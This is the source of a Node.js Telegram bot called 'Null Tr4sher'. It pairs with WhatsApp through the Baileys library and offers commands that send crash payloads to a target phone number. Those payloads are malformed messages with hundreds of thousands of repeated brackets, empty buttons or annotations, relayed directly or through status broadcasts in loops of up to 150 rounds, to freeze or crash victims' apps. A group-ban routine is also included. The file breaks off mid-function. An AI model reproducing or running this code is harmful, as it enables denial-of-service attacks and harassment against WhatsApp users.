//~~~~~~~~~( Konfigurasi )
const chalk = require("chalk");
const { Telegraf } = require("telegraf");
const axios = require("axios");
const fs = require("fs");
const cheerio = require("cheerio");
const formData = require("form-data");
const moment = require("moment-timezone");
const chacher = require("node-cache");
const path = require("path");
const pino = require("pino");
const crypto = require("crypto");

const {
  default: makeWASocket,
  useSingleFileAuthState,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  makeInMemoryStore,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  downloadAndSaveMediaMessage,
  proto,
  jidDecode,
  jidEncode,
  areJidsSameUser,
  getContentType,
  Browsers,
  DisconnectReason,
  BaileysError
} = require("@whiskeysockets/baileys");

let sock;
let whatsappStatus = false;
let reconnecting = false;

const settings = require("./settings");
const db = require("./lib/db");
const {
  esc,
  now,
  runtime,
  formatSize
} = require("./lib/func");

// ====== PATH CONFIG (PAKAI __dirname) ======
const CONNECTS_DIR = path.join(__dirname, "connects");
const SESSION_DIR  = path.join(CONNECTS_DIR, "session");
const FileNumber   = path.join(CONNECTS_DIR, "wa_numbers.json");
const FilePaired   = path.join(CONNECTS_DIR, "paired_users.json");

for (const d of [CONNECTS_DIR, SESSION_DIR]) {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
}
if (!fs.existsSync(FileNumber)) fs.writeFileSync(FileNumber, JSON.stringify([]));
if (!fs.existsSync(FilePaired)) fs.writeFileSync(FilePaired, JSON.stringify([]));

function saveData() {
  fs.writeFileSync(FileNumber, JSON.stringify(waNumbers, null, 2));
}

let pairedUsers = new Set(JSON.parse(fs.readFileSync(FilePaired, "utf8")));
let waNumbers = JSON.parse(fs.readFileSync(FileNumber, "utf8"));

// ===== MIGRASI: string → {number, owner} =====
waNumbers = waNumbers.map(x => {
  if (typeof x === "string") return { number: x, owner: "legacy" };
  if (!x.owner) return { ...x, owner: "legacy" };
  return x;
});
fs.writeFileSync(FileNumber, JSON.stringify(waNumbers, null, 2));

function savePaired() {
  fs.writeFileSync(FilePaired, JSON.stringify([...pairedUsers], null, 2));
}

const bot = new Telegraf(settings.token);
const isOwner = (id) => settings.ownerIds.includes(id.toString());
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ====== GUARD WA ======
function waReady() {
  return sock && whatsappStatus && typeof sock.relayMessage === "function";
}

// ====== SESSION HELPERS ======
function sessionExists() {
  return fs.existsSync(path.join(SESSION_DIR, "creds.json"));
}

function clearSession() {
  try {
    if (!fs.existsSync(SESSION_DIR)) return;
    for (const f of fs.readdirSync(SESSION_DIR)) {
      fs.unlinkSync(path.join(SESSION_DIR, f));
    }
    console.log(chalk.yellow("🧹 Session dibersihkan."));
  } catch (e) {
    console.log(chalk.red("clearSession error: " + e.message));
  }
}

function waitForSocketReady(s, timeoutMs = 30000) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (ok) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      try { s.ev.off("connection.update", handler); } catch (_) {}
      resolve(ok);
    };
    const timer = setTimeout(() => finish(false), timeoutMs);
    const handler = (u) => {
      if (u.connection === "connecting" || u.connection === "open") finish(true);
      if (u.connection === "close") finish(false);
    };
    s.ev.on("connection.update", handler);
  });
}

bot.use((ctx, next) => {
  if (ctx.from) db.addUser(ctx.from);
  const text = ctx.message && ctx.message.text;
  if (text && text.startsWith("/")) {
    console.log(chalk.blue("[CMD]"), text.split(/\s/)[0], "dari", ctx.from.id);
  }
  return next();
});

//~~~~~~~~~( WaConnect )~~~~~~~~~//
async function WaConnect(ctx, chatId, number) {
  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();

  sock = makeWASocket({
    version,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
    auth: state,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    syncFullHistory: false,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      whatsappStatus = true;
      reconnecting = false;
      if (ctx?.telegram && chatId) {
        await ctx.telegram.sendMessage(chatId, "✅ WhatsApp connected successfully!").catch(() => {});
      }
    }

    if (connection === "close") {
      whatsappStatus = false;
      const reason =
        lastDisconnect?.error?.output?.statusCode ||
        lastDisconnect?.error?.statusCode;

      if (ctx?.telegram && chatId) {
        await ctx.telegram.sendMessage(chatId, `❌ WhatsApp disconnected. Reason: ${reason || "unknown"}`).catch(() => {});
      }

      if (reason === DisconnectReason.loggedOut) {
        clearSession();
        sock = null;
        reconnecting = false;
        if (ctx?.telegram && chatId) {
          await ctx.telegram.sendMessage(chatId, "⚠️ Session logged out. Jalankan /pairwa ulang.").catch(() => {});
        }
        return;
      }

      if (reason === 515) {
        console.log(chalk.yellow("🔄 [515] Pairing berhasil, restart socket..."));
        if (ctx?.telegram && chatId) {
          await ctx.telegram.sendMessage(chatId, "🔄 Pairing berhasil, menyelesaikan koneksi...").catch(() => {});
        }
        setTimeout(async () => {
          try { await restoreSession(); }
          catch (e) { console.log(chalk.red("515 reconnect error:", e.message)); }
        }, 1000);
        return;
      }

      if (!reconnecting) {
        reconnecting = true;
        if (ctx?.telegram && chatId) {
          await ctx.telegram.sendMessage(chatId, "🔄 Reconnecting in 3s...").catch(() => {});
        }
        setTimeout(async () => {
          try { await restoreSession(); }
          catch (error) { console.log(chalk.red("Reconnect error:", error.message)); }
          finally { reconnecting = false; }
        }, 3000);
      }
    }
  });

  return sock;
}

//~~~~~~~~~( getSessions - PAIRING )~~~~~~~~~//
async function getSessions(ctx, chatId, number) {
  try {
    const clean = number.replace(/\D/g, "");
    if (!clean) {
      return ctx.telegram.sendMessage(chatId, "⚠️ Nomor tidak valid.").catch(() => {});
    }

    if (sessionExists()) {
      await restoreSession();
      return ctx.telegram.sendMessage(chatId, "✅ Session sudah ada, mencoba connect...").catch(() => {});
    }

    sock = await WaConnect(ctx, chatId, clean);

    const ready = await waitForSocketReady(sock, 30000);
    if (!ready) {
      return ctx.telegram.sendMessage(chatId, "⚠️ Socket WA gagal terhubung, coba lagi.").catch(() => {});
    }

    await sleep(2000);

    let pairingCode;
    try {
      pairingCode = await sock.requestPairingCode(clean);
    } catch (e) {
      return ctx.telegram.sendMessage(chatId, `❗ Gagal request pairing: ${e.message}`).catch(() => {});
    }

    const formattedCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;

    await ctx.telegram.sendMessage(chatId,
`<blockquote>
‼️ Pairing WhatsApp Number

┗〢 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘯 𝘗𝘢𝘪𝘳
 ⿻ Number: ${clean}
 ⿻ Code: <code>${formattedCode}</code>
 
📛 Tutorial Connect
 1. Buka aplikasi WhatsApp
 2. Pilih titik 3 di pojok
 3. Pilih perangkat taut
 4. Pilih tautkan dengan nomor saja
 5. Masukkan code yang di atas
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{
              text: "📋 Copy Code",
              copy_text: { text: `${formattedCode}` }
            }]
          ]
        }
      }
    ).catch(() => {});

    // ===== SIMPAN DENGAN OWNER =====
    const existingIdx = waNumbers.findIndex(x => x.number === clean);
    if (existingIdx >= 0) {
      waNumbers[existingIdx].owner = ctx.from.id.toString();
    } else {
      waNumbers.push({ number: clean, owner: ctx.from.id.toString() });
    }
    saveData();

    pairedUsers.add(ctx.from.id.toString());
    savePaired();
  } catch (error) {
    console.log(chalk.red("getSessions error: " + error.message));
    await ctx.telegram.sendMessage(chatId, `❗ Error: ${error.message}`).catch(() => {});
  }
}

function GetPotoRandom() {
  const Poto = [
    "https://files.catbox.moe/bi98z2.jpg",
    "https://files.catbox.moe/8ytctb.jpg",
    "https://files.catbox.moe/gkhlgh.jpg",
    "https://files.catbox.moe/mzwlev.jpg"
  ];
  return Poto[Math.floor(Math.random() * Poto.length)];
}

const CHANNEL_ID = "@TceSupportID";

async function checkJoin(ctx, next) {
  try {
    if (isOwner(ctx.from.id)) return next();
    const member = await ctx.telegram.getChatMember(CHANNEL_ID, ctx.from.id);
    if (["member", "administrator", "creator"].includes(member.status)) {
      return next();
    }
    await ctx.reply(
      "❌ Kamu harus join channel dulu!",
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "📢 Join Channel", url: "https://t.me/TceSupportID" }],
            [{ text: "✅ Saya sudah join", callback_data: "checkagain" }]
          ]
        }
      }
    );
  } catch (err) {
    console.error("checkJoin error:", err.message);
    return next();
  }
}

bot.action("checkagain", async (ctx) => {
  const member = await ctx.telegram.getChatMember(CHANNEL_ID, ctx.from.id);
  if (["member", "administrator", "creator"].includes(member.status)) {
    await ctx.editMessageText("✅ Kamu sudah join channel!", {
      reply_markup: {
        inline_keyboard: [[{ text: "✅ Verifikasi", callback_data: "verify" }]]
      }
    });
  } else {
    await ctx.answerCbQuery("❌ Belum join channel!");
  }
});

bot.action("verify", async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText("🎉 Verifikasi berhasil! Sekarang kamu bisa pakai fitur bot.");
  await ctx.reply("🚀 Ketik /start untuk mulai!");
});

//~~~~~~~~~( Commands )~~~~~~~~~//
bot.command(["start", "menu", "help"], checkJoin, async (ctx) => {
  ctx.replyWithPhoto("https://files.catbox.moe/02x6ly.jpg", {
    caption: `<blockquote>
─( ⁉️ ) <b>Hello, I am NTED"s personal assistant.</b>

❏──「 Null Tr4sher 」──❐
 ⿻ Version: 1.0
 ⿻ Owner: @NtedCrasherExec
 ⿻ Prefix: / ( slash )

❏──「 Informasi Bot 」──❐
 ⿻ Runtime: <code>${runtime()}</code>
 ⿻ Waktu: <code>${now()}</code>
 ⿻ Zona Waktu: <code>${esc(settings.timezone)}</code>

‼️ Platform ─ WhatsApp ─ Telegram
   I am a Telegram bot that connects using baileys then to whatsapp, I was created by: @TceSupportID please follow the channel to get the latest updates.
</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "⁉️「 Tools Menu 」", callback_data: "toolss" }],
        [
          { text: "📛「 Connection 」", callback_data: "sendermenu" },
          { text: "🌸「 Tr4sh 」", callback_data: "addmenu" }
        ]
      ]
    }
  });
});

bot.action("toolss", async (ctx) => {
  await ctx.answerCbQuery("Tools Menu ⚙");
  const Thumbnail = GetPotoRandom();
  const Menu = `<blockquote>
❏──「 Null Tr4sher 」──❐
 ⿻ Version: 1.0
 ⿻ Owner: @NtedCrasherExec
 ⿻ Prefix: / ( slash )

❏──「 Open Menu 」──❐
┗〢 Tools Menu ⁉️
 ❍ /cekid - cek id user
 ❍ /info - info user
 ❍ /ping - cek latency
 ❍ /stats - status bot
</blockquote>`;

  const keyboard = [
    [{ text: "「 ⁉️ 𝘉𝘢𝘤𝘬 𝘔𝘦𝘯𝘶 」", callback_data: "backu" }],
    [{ text: "「 Channel Info 」", url: "https://t.me/TceSupportID" }]
  ];

  try {
    await ctx.editMessageMedia({
      type: "photo", media: Thumbnail, caption: Menu, parse_mode: "HTML",
    }, { reply_markup: { inline_keyboard: keyboard } });
  } catch (error) {
    if (error.response && error.response.error_code === 400) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("addmenu", async (ctx) => {
  await ctx.answerCbQuery("BVG Menu ⚙");
  const Thumbnail = GetPotoRandom();
  const Menu = `<blockquote>
❏──「 Null Tr4sher 」──❐
 ⿻ Version: 1.0
 ⿻ Owner: @NtedCrasherExec
 ⿻ Prefix: / ( slash )

❏──「 Open Menu 」──❐
┗〢 Bvg Personal Chat ⁉️
 ❍ /car - new crash bvg
 ❍ /dbut - delay Invisible
 ❍ /pom - freeze chat
 ❍ /ios - ios Invisible 

❏──「 Open Menu 」──❐
┗〢 Only Group Chat ⁉️
 ❍ /doct - blank cht
 ❍ /dban - banned group
</blockquote>`;

  const keyboard = [
    [{ text: "「 ⁉️ 𝘉𝘢𝘤𝘬 𝘔𝘦𝘯𝘶 」", callback_data: "backu" }],
    [{ text: "「 Channel Info 」", url: "https://t.me/TceSupportID" }]
  ];

  try {
    await ctx.editMessageMedia({
      type: "photo", media: Thumbnail, caption: Menu, parse_mode: "HTML",
    }, { reply_markup: { inline_keyboard: keyboard } });
  } catch (error) {
    if (error.response && error.response.error_code === 400) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("sendermenu", async (ctx) => {
  await ctx.answerCbQuery("Connection Menu ⚙");
  const Thumbnail = GetPotoRandom();
  const Menu = `<blockquote>
❏──「 Null Tr4sher 」──❐
 ⿻ Version: 1.0
 ⿻ Owner: @NtedCrasherExec
 ⿻ Prefix: / ( slash )

❏──「 Open Menu 」──❐
┗〢 Connection Menu ⁉️
 ❍ /pairwa - add number
 ❍ /delwa - delete number
 ❍ /listwa - daftar number
</blockquote>`;

  const keyboard = [
    [{ text: "「 ⁉️ 𝘉𝘢𝘤𝘬 𝘔𝘦𝘯𝘶 」", callback_data: "backu" }],
    [{ text: "「 Channel Info 」", url: "https://t.me/TceSupportID" }]
  ];

  try {
    await ctx.editMessageMedia({
      type: "photo", media: Thumbnail, caption: Menu, parse_mode: "HTML",
    }, { reply_markup: { inline_keyboard: keyboard } });
  } catch (error) {
    if (error.response && error.response.error_code === 400) {
      await ctx.answerCbQuery();
    }
  }
});

bot.action("backu", async (ctx) => {
  await ctx.answerCbQuery("Menu Utama");
  const Thumbnail = GetPotoRandom();
  const Menu = `
<blockquote>
─( ⁉️ ) <b>Hello, I am NTED"s personal assistant.</b>

❏──「 Null Tr4sher 」──❐
 ⿻ Version: 1.0
 ⿻ Owner: @NtedCrasherExec
 ⿻ Prefix: / ( slash )
 
❏──「 Informasi Bot 」──❐
 ⿻ Runtime: <code>${runtime()}</code>
 ⿻ Waktu: <code>${now()}</code>
 ⿻ Zona Waktu: <code>${esc(settings.timezone)}</code>

‼️ Platform ─ WhatsApp ─ Telegram
   I am a Telegram bot that connects using baileys then to whatsapp, I was created by: @TceSupportID please follow the channel to get the latest updates.
</blockquote>`;

  const keyboard = [
    [{ text: "⁉️「 Tools Menu 」", callback_data: "toolss" }],
    [
      { text: "📛「 Connection 」", callback_data: "sendermenu" },
      { text: "🌸「 Tr4sh 」", callback_data: "addmenu" }
    ]
  ];

  try {
    await ctx.editMessageMedia({
      type: "photo", media: Thumbnail, caption: Menu, parse_mode: "HTML",
    }, { reply_markup: { inline_keyboard: keyboard } });
  } catch (error) {
    if (error.response && error.response.error_code === 400) {
      await ctx.answerCbQuery();
    }
  }
});

bot.command("ping", (ctx) => {
  ctx.reply(
    `🏓 <b>Pong!</b>\n├ Runtime : <code>${runtime()}</code>\n├ RAM : <code>${formatSize(process.memoryUsage().rss)}</code>\n└ Waktu : <code>${now()}</code>`,
    { parse_mode: "HTML" }
  );
});

bot.command("cekid", (ctx) => {
  ctx.reply(
    `🪪 <b>Info ID</b>\n├ Nama : ${esc(ctx.from.first_name)}\n├ Username : ${ctx.from.username ? "@" + esc(ctx.from.username) : "-"}\n├ User ID : <code>${ctx.from.id}</code>\n└ Chat ID : <code>${ctx.chat.id}</code>`,
    { parse_mode: "HTML" }
  );
});

bot.command("info", (ctx) => {
  ctx.reply(
    `ℹ️ <b>${esc(settings.botName)}</b>\n├ Runtime : <code>${runtime()}</code>\n├ Zona waktu : <code>${esc(settings.timezone)}</code>\n└ Waktu : <code>${now()}</code>`,
    { parse_mode: "HTML" }
  );
});

bot.command("stats", (ctx) => {
  ctx.reply(
    `📊 <b>Statistik</b>\n├ Total user : <code>${db.total()}</code>\n├ Runtime : <code>${runtime()}</code>\n└ Update : <code>${now()}</code>`,
    { parse_mode: "HTML" }
  );
});

bot.command("pairwa", checkJoin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const number = args[1];
  if (!number) {
    return ctx.reply("❌ Masukkan nomor WhatsApp. Contoh: /pairwa 628123456789");
  }
  if (waReady()) {
    return ctx.reply("⚠️ WhatsApp sudah terkoneksi. Tidak perlu pair ulang.");
  }
  await getSessions(ctx, ctx.chat.id, number);
});

bot.command(["listwa", "waku"], async (ctx) => {
  if (!isOwner(ctx.from.id)) {
    const mine = waNumbers.filter(x => x.owner === ctx.from.id.toString());
    if (mine.length === 0) return ctx.reply("📭 Kamu belum punya nomor.");
    const list = mine.map((n, i) => `${i + 1}. ${n.number}`).join("\n");
    return ctx.reply(`📋 Nomor milikmu:\n${list}`);
  }

  if (waNumbers.length === 0) {
    return ctx.reply("📭 Tidak ada nomor WhatsApp yang aktif.");
  }
  const list = waNumbers.map((n, i) => `${i + 1}. ${n.number} — owner: ${n.owner}`).join("\n");
  ctx.reply(`📋 Daftar nomor WhatsApp:\n${list}`);
});

bot.command("delwa", checkJoin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  const number = args[1];
  if (!number) {
    return ctx.reply("❌ Masukkan nomor yang mau dihapus. Contoh: /delwa 628123456789");
  }

  const idx = waNumbers.findIndex(x => x.number === number);
  if (idx === -1) return ctx.reply("⚠️ Nomor tidak ditemukan di daftar.");

  if (!isOwner(ctx.from.id) && waNumbers[idx].owner !== ctx.from.id.toString()) {
    return ctx.reply("❌ Kamu hanya bisa hapus nomor sendiri.");
  }

  waNumbers.splice(idx, 1);
  saveData();
  ctx.reply(`🗑️ Nomor ${number} berhasil dihapus.`);
});

// ============= PREFLIGHT GUARD =============
async function preflight(ctx, cmd) {
  const args = ctx.message.text.split(" ");
  const kkk = args[1];
  const userId = ctx.from.id.toString();

  if (isOwner(userId)) {
    if (waNumbers.length === 0) {
      ctx.reply("🚧 Belum ada session WhatsApp. Lakukan /pairwa dulu.");
      return null;
    }
  } else if (!pairedUsers.has(userId)) {
    ctx.reply("❌ Kamu belum /pairwa.");
    return null;
  }

  if (!waReady()) {
    ctx.reply("❌ WhatsApp belum terkoneksi. Jalankan /pairwa dulu atau tunggu reconnect.");
    return null;
  }

  if (!kkk) {
    ctx.replyWithPhoto({ url: "https://files.catbox.moe/dcnz2q.jpg" },
      { caption: `❌ Contoh:\n<code>${cmd} 628123456789</code>`, parse_mode: "HTML" });
    return null;
  }

  const rawTarget = kkk;
  if (!/^\+?\d{7,15}$/.test(rawTarget)) {
    ctx.reply(`❌ Nomor tidak valid\nContoh:\n<code>${cmd} ${rawTarget}</code>`, { parse_mode: "HTML" });
    return null;
  }

  const target = rawTarget.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  return { rawTarget, target };
}

//~~~~~~~~~( Command Bvg )~~~~~~~~~//
bot.command("car", checkJoin, async (ctx) => {
  const cmd = ctx.message.text.split(" ")[0];
  const pre = await preflight(ctx, cmd);
  if (!pre) return;
  const { rawTarget, target } = pre;

  const sent = await ctx.reply(`🚀 CAR → ${rawTarget}\n⏳ Proses...`, { parse_mode: "HTML" });

  (async () => {
    try {
      for (let n = 0; n < 150; n++) {
        await oh(sock, target);
        await sleep(5000);
        console.log(chalk.green(`car → ${target} ${n + 1}/150`));
      }
      await ctx.telegram.editMessageText(
        ctx.chat.id, sent.message_id, null,
        `✅ CAR selesai → ${rawTarget}`
      );
    } catch (err) {
      console.log(chalk.red(`Error: ${err.message}`));
      await ctx.reply(`❌ Error: ${err.message}`);
    }
  })();
});

bot.command("dbut", checkJoin, async (ctx) => {
  const cmd = ctx.message.text.split(" ")[0];
  const pre = await preflight(ctx, cmd);
  if (!pre) return;
  const { rawTarget, target } = pre;

  const sent = await ctx.reply(`🚀 DBUT → ${rawTarget}\n⏳ Proses...`, { parse_mode: "HTML" });

  (async () => {
    try {
      for (let n = 0; n < 50; n++) {
        await annotationz(sock, target);
        await sleep(3000);
        await docThumb(sock, target);
        await Attrs(sock, target);
        await sleep(3000);
        console.log(chalk.green(`dbut → ${target} ${n + 1}/50`));
      }
      await ctx.telegram.editMessageText(
        ctx.chat.id, sent.message_id, null,
        `✅ DBUT selesai → ${rawTarget}`
      );
    } catch (err) {
      console.log(chalk.red(`Error: ${err.message}`));
      await ctx.reply(`❌ Error: ${err.message}`);
    }
  })();
});

bot.command("pom", checkJoin, async (ctx) => {
  const cmd = ctx.message.text.split(" ")[0];
  const pre = await preflight(ctx, cmd);
  if (!pre) return;
  const { rawTarget, target } = pre;

  const sent = await ctx.reply(`🚀 POM → ${rawTarget}\n⏳ Proses...`, { parse_mode: "HTML" });

  (async () => {
    try {
      for (let n = 0; n < 150; n++) {
        await Attrs(sock, target);
        console.log(chalk.green(`pom → ${target} ${n + 1}/150`));
      }
      await ctx.telegram.editMessageText(
        ctx.chat.id, sent.message_id, null,
        `✅ POM selesai → ${rawTarget}`
      );
    } catch (err) {
      console.log(chalk.red(`Error: ${err.message}`));
      await ctx.reply(`❌ Error: ${err.message}`);
    }
  })();
});

bot.command("ios", checkJoin, async (ctx) => {
  const cmd = ctx.message.text.split(" ")[0];
  const pre = await preflight(ctx, cmd);
  if (!pre) return;
  const { rawTarget, target } = pre;

  const sent = await ctx.reply(`🚀 IOS → ${rawTarget}\n⏳ Proses...`, { parse_mode: "HTML" });

  (async () => {
    try {
      for (let n = 0; n < 150; n++) {
        await iozk(sock, target);
        await sleep(3000);
        await iozk2(sock, target);
        await sleep(3000);
        console.log(chalk.green(`ios → ${target} ${n + 1}/150`));
      }
      await ctx.telegram.editMessageText(
        ctx.chat.id, sent.message_id, null,
        `✅ IOS selesai → ${rawTarget}`
      );
    } catch (err) {
      console.log(chalk.red(`Error: ${err.message}`));
      await ctx.reply(`❌ Error: ${err.message}`);
    }
  })();
});

//~~~~~~~~~( Bvg Function )~~~~~~~~~//
async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw new Error("@g.us server required");
  await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add");
}

async function oh(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "X" },
          carouselMessage: {},
          bloksWidget: {
            uuid: crypto.randomUUID(),
            data: "[".repeat(500000),
            type: "im_a2ui",
            fallback: "A2UI"
          }
        }
      }
    }
  }, { isSecret: true });
}

async function iozk(sock, target, i = 1) {
  for (let z = 0; z < i; z++) {
    await sock.relayMessage(target, {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [{
                  view_model: {
                    primitive: {
                      text: "DsynC",
                      inline_entities: ["{".repeat(500000)],
                      __typename: "GenAIMarkdownTextUXPrimitive"
                    },
                    __typename: "GenAISingleLayoutViewModel"
                  }
                }]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: { botJid: "0@bot" }
            }
          }
        }
      }
    }, { isSecret: true });
    await sleep(1000);
  }
}

async function iozk2(sock, target, i = 1) {
  for (let z = 0; z < i; z++) {
    await sock.relayMessage("status@broadcast", {
      botForwardedMessage: {
        message: {
          richResponseMessage: {
            messageType: 1,
            submessages: [],
            unifiedResponse: {
              data: Buffer.from(JSON.stringify({
                response_id: crypto.randomUUID(),
                sections: [{
                  view_model: {
                    primitive: {
                      text: "DsynC",
                      inline_entities: ["{".repeat(500000)],
                      __typename: "GenAIMarkdownTextUXPrimitive"
                    },
                    __typename: "GenAISingleLayoutViewModel"
                  }
                }]
              }))
            },
            contextInfo: {
              forwardingScore: 1,
              isForwarded: true,
              forwardOrigin: 4,
              forwardedAiBotMessageInfo: { botJid: "0@bot" }
            }
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta", attrs: {},
        content: [{
          tag: "mentioned_user", attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: [] }]
        }]
      }]
    });
    await sleep(1000);
  }
}

async function annotationz(sock, target) {
  for (let z = 0; z < 100; z++) {
    await sock.relayMessage("status@broadcast", {
      videoMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc",
        mimetype: "video/mp4",
        fileSha256: "dy6rjLbf2Zdmt1V3y15X1WYHEsUXS1DUh4G6yV3fM2I=",
        fileLength: "3557776",
        seconds: 19,
        mediaKey: "QOhY9TSI4bfSBp0Bzj80QyW5EYJ6OQL4Ak3pjb1vUMM=",
        height: 480, width: 480,
        fileEncSha256: "g7ZxEPo0YUaHnEYkFfu8BvMh6g4Ib/Y7IzkJFEdZyW0=",
        directPath: "/v/t62.7161-24/706703788_1346924573971315_1414158698537555666_n.enc",
        mediaKeyTimestamp: "1779806852",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAABBQEAAAAAAAAAAAAAAAAAAQIDBAUGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAyljXsWcs6SHnV187CNqPOaKTLlsSMLm5znQzZrVqqY+c2+fqriMG7WzmumbuW5oSzka2RLJlddB0tzIDC/Lkvpuuzsi5yrr8tr4iu+zSk7QCEtOgctXzBRK9cKZsodMwDmb/xAAqEAACAgIBAwEIAwEAAAAAAAABAgADBBESISIxQQUQEzJRYXFyFBUjUv/aAAgBAQABPwBah2AHyu4UIXlFqVgDv0hx+zkYKmJYD0nwW0p35iU9xDQVNsiGp+Ji2ntP0GozdugOk9m0/HbTeBL/AGcjdEcifwL6w2tNHrtQAPWeka5/xBd27I7tw3kKCPMrVDUp49d6gp2T11PZKBC3WCMUgCWfeZOHjlGYoJqvR6S8IF7Zj4WU1KlU6GHBzvRJhC/Gv42KRN7ENYaW5dWKwQzMzkej/Mzmw3HYsswzrFo/WGMuwSQDDfYjgfMCY9/DXMamUitkByCymf1r2hmB4j0Eet62KspBmtI0x7QKcf8AWZWWETYgzLLU7FJnwSnDl5MekFQzHosbKWq3cqvruXaP+ZmpTbSeeg3pG6K0qyuxB9BEsW26sOem499dY7dCPkcrVPoDMm7VQ6bU+Zf3WEgECVWvUwKmWX2WNyc7Mb5WieBOWvED2MNlvEoWy5WYAaWZFhqq7bPPpGZnO2PuBjghTBivwU+diGhxrpHQrX9pTZwxbhvzAA9Tf9CFWHke6sgHZjMvB/vP/8QAIxEAAgICAQIHAAAAAAAAAAAAAQIAEQMhEgQxEBMiMkFRcf/aAAgBAgEBPwBSwAjOQauByZbzLdi5evdHG/BLq7mXXGcTGtVu4uRiF9MViNTN3E4jj3mYGigH7OlVtmrrU4/JmYglZ5rXEJNkxHKlR9wiwRMooif/xAAeEQACAwABBQAAAAAAAAAAAAAAAQIQERIDITJRkf/aAAgBAwEBPwASMpUqYqlqzPZ1JuMkkqRpJyfiSXc0RwXFs4qKRm/BkVh//9k=",
        contextInfo: { pairedMediaType: 4, statusSourceType: 0 },
        annotations: Array.from({ length: 70000 }, () => ({
          shouldSkipConfirmation: true,
          embeddedContent: { embeddedMusic: { author: "\0" } },
          embeddedAction: true
        }))
      }
    }, {
      additionalNodes: [{
        tag: "meta", attrs: {},
        content: [{
          tag: "mentioned_users", attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: [] }]
        }]
      }]
    });
  }
}

async function Attrs(sock, target) {
  const msg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          },
          contextInfo: {
            statusAttributionType: 3,
            statusAttributions: Array.from({ length: 2000 }, () => ({ type: 1 }))
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, { ptcp: true });
}

async function docThumb(sock, target, gs = true, array = false) {
  const docs = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc",
      mimetype: "application/pdf",
      fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
      fileLength: "72028", pageCount: 1,
      mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
      fileName: "ZeppsynC.pdf",
      fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
      directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc",
      mediaKeyTimestamp: "1779839963",
      thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc",
      thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
      thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
